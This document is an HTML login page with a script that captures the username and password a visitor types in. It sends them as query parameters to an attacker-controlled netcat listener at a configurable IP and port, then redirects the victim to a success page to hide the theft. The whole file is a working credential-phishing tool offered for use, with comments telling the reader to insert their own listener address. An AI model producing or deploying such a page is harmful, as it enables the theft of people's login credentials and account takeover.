<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    /* Add your custom CSS styles here */
  </style>
</head>
<body>
  <h2>Login</h2>
  <form id="loginForm">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required><br>

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required><br>

    <input type="submit" value="Login">
  </form>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault(); // Prevent the form from being submitted

      // Retrieve the form inputs
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;

      // Netcat listener configuration
      var ncHost = '192.168.10.175';  // Replace with your netcat listener's IP address
      var ncPort = 1234;               // Replace with your netcat listener's port

      // Create a new <script> element
      var script = document.createElement('script');

      // Set the script source to the netcat listener URL with login information as query parameters
      script.src = 'http://' + ncHost + ':' + ncPort + '/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);

      // Append the <script> element to the document to trigger the request
      document.body.appendChild(script);

      // Redirect to a success page or display a success message
      window.location.href = 'success.html';
    });
  </script>
</body>
</html>
